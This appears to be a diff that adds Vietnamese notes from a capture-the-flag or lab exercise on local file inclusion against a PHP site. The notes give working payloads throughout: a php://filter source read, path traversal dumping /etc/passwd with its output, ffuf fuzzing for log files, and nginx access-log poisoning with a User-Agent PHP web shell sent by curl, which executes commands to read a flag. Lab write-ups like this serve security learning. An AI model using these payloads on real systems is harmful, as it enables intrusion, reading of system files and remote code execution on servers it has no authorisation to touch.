@@ -1,0 +1,118 @@
+LFI 
+
+=> tim duoc endpoint nghi LFI (Do su dung ?page= + ten de tai trang)
+
+=> thu kiem tra ?page=contact => load ngay trang
+=> thu truy cap /contact.php => chinh la noi dung ma web hien
+=> chac chan day la 1 func co chuc nang load
+
+=> chuc nang tu them .php nen ko can them .php nua
+
+
+thu voi cac the load wrapper
+
+=> http://94.237.61.242:51189/index.php?page=php://filter/convert.base64-encode/resource=index (ko can them .php)
+
+=> decode base64
+ 
+
+=> thu doc source cua web de xem co doan nao bi an di loggic xu ly lfi 
+
+<?php
+if(!isset($_GET['page'])) {
+  include "main.php";
+}
+else {
+  $page = $_GET['page'];
+  if (strpos($page, "..") !== false) {
+    include "error.php";
+  }
+  else {
+    include $page . ".php";
+  }
+}
+?>
+
+
+ <?php 
+                  // echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
+                ?>
+
+
+=> phat hien endpoint an
+=> thu truy cap vo http://94.237.61.242:51189/ilf_admin/index.php?log=http.log
+
+=> phat hien 1 parameter kha nghi (LFI)
+
+=> thu payload
+http://94.237.61.242:51189/ilf_admin/index.php?log=../../../../../etc/passwd
+=> root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+...snip...
+
+=> khang dinh day chinh la LFI
+
+=> thu log poisoning
+
+=> su dung cong cu de test thu cac file, direc root hay cho LFI
+home/$USER/public_html/ 
+home/$USER/www/         
+srv/www/sites/          
+var/www/public/         
+srv/www/            
+var/www/html/default/   
+home/www/               
+srv/www/html/           
+var/www/sites/          
+home/httpd/             
+var/www/                
+var/www/public_html/    
+var/www/html/ (hop le) => http://94.237.61.242:51189/ilf_admin/index.php?log=../../../../../../../var/www/html/index.php
+
+=> ta nhan ra cac file .php nhu tren duoc render truc tiep => cho phep thuc thi code php (co the nhiem doc de lay rce)
+
+
+=> da hieu duoc root direc, ta thu quet cac direc log hay co
+ ffuf -w LFI-WordList-Linux.txt:FUZZ -u 'http://94.237.61.242:51189/ilf_admin/index.php?log=./logs/../../../../../../FUZZ'  -fs 2046
+
+=> thu duoc
+/var/log/nginx/access.log 
+/var/log/nginx/error.log 
+
+=> thu nhiem doc access.log (User-Agent: <?php system($_GET['cmd']); ?>)
+=> su dung curl hoac burp de gui request den
+curl -s 94.237.61.242:51189/index.php -H "User-Agent: <?php system('cd ../../../../../../../../; ls'); ?>"
+
+curl -s 94.237.50.221:31352/index.php -H "User-Agent: <?php system('cd ../../../../../../../../;cat flag_dacc60f2348d.txt'); ?>"
+
+=> luc nay su dung payload LFI de truy cap access.log nhiem doc
+http://94.237.50.221:31352/ilf_admin/index.php?log=../../../../../../../../../var/log/nginx/access.log
+
+=> thu duoc ket qua
+
+10.30.18.144 - - [27/Jul/2025:06:10:42 +0000] "GET /index.php HTTP/1.1" 200 15850 "-" "a9a892dbc9faf9a014f58e007721835e
+"
+
+=> neu muon dung ?cmd =id chi can don gian the nay thoi
+
+curl -s "http://83.136.255.158:55820/index.php" -H @Poison
+
+@Poison {
+User-Agent: <?php system($_GET['cmd']); ?>
+}
+http://83.136.255.158:55820/ilf_admin/index.php?log=./logs/../../../../../../var/log/nginx/access.log&cmd=cd%20../../../../../;cat%20flag_dacc60f2348d.txt
+
+=> tuc la &cmd= thi cmd= moi dung duoc, chu ko phai ? 
+
+
+
+
+
+
+
